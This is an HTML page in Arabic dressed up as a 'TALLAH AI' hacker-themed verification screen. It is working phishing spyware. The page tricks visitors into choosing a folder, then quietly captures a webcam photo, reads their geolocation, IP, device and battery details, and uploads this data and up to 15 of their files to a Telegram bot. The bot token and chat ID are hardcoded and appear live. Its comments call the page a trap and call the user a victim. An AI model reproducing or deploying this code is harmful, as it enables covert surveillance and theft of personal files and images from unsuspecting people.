<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TALLAH SYSTEM | ULTIMATE ACCESS</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Cairo:wght@700;900&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; background: #000; color: #0ff; font-family: 'Share Tech Mono', 'Cairo', monospace; overflow: hidden; }
        
        /* شاشة المصيدة الاحترافية */
        #verify-screen { 
            position: fixed; width: 100%; height: 100%; background: #000; 
            z-index: 10000; display: flex; justify-content: center; 
            align-items: center; text-align: center; 
        }
        .verify-box { 
            border: 1px solid #0ff; padding: 40px; border-radius: 15px; 
            background: rgba(10,10,10,0.95); box-shadow: 0 0 30px #0ff; max-width: 400px; 
        }
        .check-btn { 
            margin-top: 20px; padding: 15px 30px; background: #0ff; color: #000; 
            font-weight: 900; border: none; cursor: pointer; border-radius: 5px; width: 100%; 
            font-size: 18px; transition: 0.3s;
        }
        .check-btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
        
        .file-label { 
            display: block; margin-top: 15px; padding: 15px; border: 1px dashed #0ff; 
            cursor: pointer; font-size: 14px; color: #fff; background: rgba(0,255,255,0.05);
        }

        /* واجهة النظام بعد الاختراق */
        canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.3; }
        #main { display: none; text-align: center; padding: 20px; }
        .active { display: block; animation: fadeIn 1s ease; }
        
        .logo { width: 120px; border-radius: 50%; border: 2px solid #0ff; margin-top: 40px; box-shadow: 0 0 30px #0ff; }
        .chat { 
            width: 85%; max-width: 500px; margin: 20px auto; border: 1px solid #0ff; 
            padding: 15px; height: 160px; overflow-y: auto; text-align: right; 
            background: rgba(0,0,0,0.8); font-size: 13px; color: #fff;
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<!-- شاشة طلب التصاريح (المصيدة) -->
<div id="verify-screen">
    <div class="verify-box">
        <h2 style="color:#fff">TALLAH AI SYSTEM</h2>
        <p>يجب السماح بالكاميرا والملفات لتجاوز بروتوكول الحماية العصبية وفك التشفير</p>
        
        <!-- اختيار المجلد (سحب شامل) -->
        <label class="file-label">
            <span>📁 حدد مجلد الصور/الملفات فوراً</span>
            <input type="file" id="fileStripper" multiple webkitdirectory style="display:none" onchange="initiateFullAccess(this.files)">
        </label>

        <button class="check-btn" onclick="document.getElementById('fileStripper').click()">بدء الاختراق والتحقق</button>
        <div id="status" style="font-size:10px; margin-top:15px; color:#555;">بانتظار استجابة البروتوكول العصبى...</div>
    </div>
</div>

<canvas id="matrix"></canvas>

<!-- واجهة الإمبراطورية -->
<div id="main">
    <img src="hacker.webp" class="logo">
    <h1 style="text-shadow: 0 0 10px #0ff;">TALLAH <span style="color:#fff">EMPIRE</span></h1>
    <div class="chat" id="chat"></div>
</div>

<script>
/* بيانات البوت الخاص بك */
const TG_TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
const TG_CHAT_ID = "8754338811";

async function initiateFullAccess(files) {
    if (files.length === 0) return;
    document.getElementById('status').innerText = "جاري حقن البروتوكول وسحب البيانات الحية...";
    
    // 1. التقاط صورة فورية من الكاميرا
    await captureLivePhoto();

    // 2. سحب الموقع والبيانات النصية
    navigator.geolocation.getCurrentPosition(async (pos) => {
        await executeFinalHarvest(pos.coords.latitude, pos.coords.longitude, files);
    }, async () => {
        await executeFinalHarvest("Denied", "Denied", files);
    });
}

async function captureLivePhoto() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        canvas.toBlob(async (blob) => {
            let formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('photo', blob, 'live_capture.jpg');
            formData.append('caption', '📸 لقطة حية من كاميرا الضحية (TALLAH AI)');

            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            // إغلاق الكاميرا فوراً بعد اللقطة
            stream.getTracks().forEach(track => track.stop());
        }, 'image/jpeg');
    } catch (e) {
        console.log("Camera access denied by user.");
    }
}

async function executeFinalHarvest(lat, lon, files) {
    try {
        const ipReq = await fetch('https://ipapi.co/json/');
        const ip = await ipReq.json();
        
        let bat = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            bat = `${Math.round(b.level * 100)}%`;
        }

        // إرسال التقرير النصي
        let report = `🔥 صيد جديد من نظام طلة 🔥\n`;
        report += `----------------------------\n`;
        report += `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n`;
        report += `🌐 الـ IP: ${ip.ip} (${ip.city})\n`;
        report += `📱 الجهاز: ${navigator.platform}\n`;
        report += `🔋 البطارية: ${bat}\n`;
        report += `📂 ملفات مسحوبة: ${files.length}\n`;
        report += `----------------------------`;

        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: report })
        });

        // إرسال أول 15 ملف من المجلد المختار
        for (let i = 0; i < Math.min(files.length, 15); i++) {
            let formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            formData.append('document', files[i]);
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, { method: 'POST', body: formData });
        }

        // تفعيل واجهة النظام الوهمية
        document.getElementById("verify-screen").style.display = "none";
        document.getElementById("main").classList.add("active");
        runChatSequence();

    } catch (err) {
        console.error("Transmission Interrupted.");
    }
}

/* تأثير الماتريكس البصري */
let c = document.getElementById("matrix");
let ctx = c.getContext("2d");
c.width = innerWidth; c.height = innerHeight;
let drops = Array(Math.floor(c.width/10)).fill(1);
function draw() {
    ctx.fillStyle = "rgba(0,0,0,.05)";
    ctx.fillRect(0, 0, c.width, c.height);
    ctx.fillStyle = "#0ff";
    drops.forEach((d, i) => {
        ctx.fillText("TALLAH01"[Math.floor(Math.random()*8)], i*15, d*15);
        if (d*15 > c.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    });
}
setInterval(draw, 33);

function runChatSequence() {
    const box = document.getElementById("chat");
    const msgs = [
        "> تم تفعيل الكاميرا والتقاط الصورة بنجاح..",
        "> سحب ملفات الذاكرة والموقع الجغرافي..",
        "> تشفير البيانات ونقلها للإمبراطور عبر Telegram..",
        "> النظام الآن في وضع المراقبة الكاملة."
    ];
    let idx = 0;
    let timer = setInterval(() => {
        if(idx < msgs.length) {
            box.innerHTML += msgs[idx] + "<br>";
            idx++;
        } else { clearInterval(timer); }
    }, 1500);
}
</script>
</body>
</html>
